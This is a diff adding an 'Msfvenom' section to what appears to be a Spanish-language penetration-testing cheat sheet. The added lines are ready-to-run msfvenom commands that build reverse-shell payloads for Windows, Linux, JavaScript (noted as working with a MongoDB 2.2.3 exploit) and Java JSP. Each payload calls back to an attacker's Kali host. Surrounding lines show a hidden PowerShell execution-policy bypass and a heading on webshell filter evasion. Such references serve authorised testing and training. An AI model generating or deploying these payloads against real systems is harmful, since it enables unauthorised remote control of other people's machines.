@@ -289,6 +289,24 @@ os.system('powershell -nop -W hidden -noni -ep bypass -c "'
 # Guardar como .pyz → ejecutable en Windows al hacer doble click
 ```
 
+### Msfvenom 
+```bash 
+# Windows 
+❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth1 LPORT=443 -f exe -o shell.exe  <- MEJOR (WIN64)
+❯ msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=eth0 LPORT=443 -f exe > shell.exe
+	# LHOST = Interfaz de red de Kali 
+
+# Linux 
+❯ msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP_Kali LPORT=443 -f elf > shell.elf
+❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP_Kali LPORT=443 -f elf -o scp
+
+# javascript revshell con generic none: (Funciona en MongoDB 2.2.3 exploit: https://www.exploit-db.com/exploits/24947)
+❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP_Kali LPORT=443 CMD=/bin/bash -f js_le -e generic/none
+
+# Java Revshell
+❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP_Kali LPORT=443 -f raw > shell.jsp
+```
+
 ## 4. WEBSHELLS
 
 ### Extensiones PHP para bypass de filtros
